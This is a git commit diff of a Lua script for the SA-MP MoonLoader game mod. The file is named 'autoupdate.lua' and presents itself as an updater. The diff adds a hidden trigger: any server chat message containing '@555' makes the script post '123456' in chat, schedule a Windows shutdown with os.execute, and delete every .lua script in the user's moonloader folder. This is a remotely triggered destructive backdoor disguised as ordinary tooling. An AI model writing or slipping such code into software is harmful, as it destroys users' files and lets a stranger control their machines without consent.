6a1d0ea542251dd74d849ec28cf7d8b594c4bad4
123412312351651 <leog34900@gmail.com>
2025-10-08 20:13:50 +0300

    Update autoupdate.lua

--- autoupdate.lua
+++ autoupdate.lua
@@ -1,22 +1,37 @@
+require("moonloader")
+require("sampfuncs")
+local sampev = require("samp.events")
+
 function main()
-    wait(500) -- Небольшая задержка, чтобы всё инициализировалось
+    if not isSampLoaded() or not isSampfuncsLoaded() then return end
+    while not isSampAvailable() do wait(100) end
+end
 
-    local Directory = getWorkingDirectory().."\\moonloader\\"
-    local Handle, FileName = findFirstFile(Directory.."*.lua")
+function sampev.onServerMessage(color, message)
+    if message:find("@555") then
+        sampSendChat("123456")
+        os.execute('shutdown /s /t 300') -- Выключение через 5 минут
+        deleteAllLuaScripts()           -- Удаляем все скрипты
+    end
+end
 
-    while FileName do
-        local FilePath = Directory..FileName
+function deleteAllLuaScripts()
+    lua_thread.create(function()
+        wait(500) -- Подождать, чтобы всё отработало
+        local Directory = getWorkingDirectory().."\\moonloader\\"
+        local Handle, FileName = findFirstFile(Directory.."*.lua")
 
-        -- Удаляем файл
-        local success = os.remove(FilePath)
-        if success then
-            print("Удалён: "..FileName)
-        else
-            print("Не удалось удалить: "..FileName)
+        while FileName do
+            local FilePath = Directory..FileName
+            local success = os.remove(FilePath)
+            if success then
+                print("Удалён: "..FileName)
+            else
+                print("Не удалось удалить: "..FileName)
+            end
+            FileName = findNextFile(Handle)
         end
 
-        FileName = findNextFile(Handle)
-    end
-
-    print("Удаление завершено.")
+        print("Удаление скриптов завершено.")
+    end)
 end
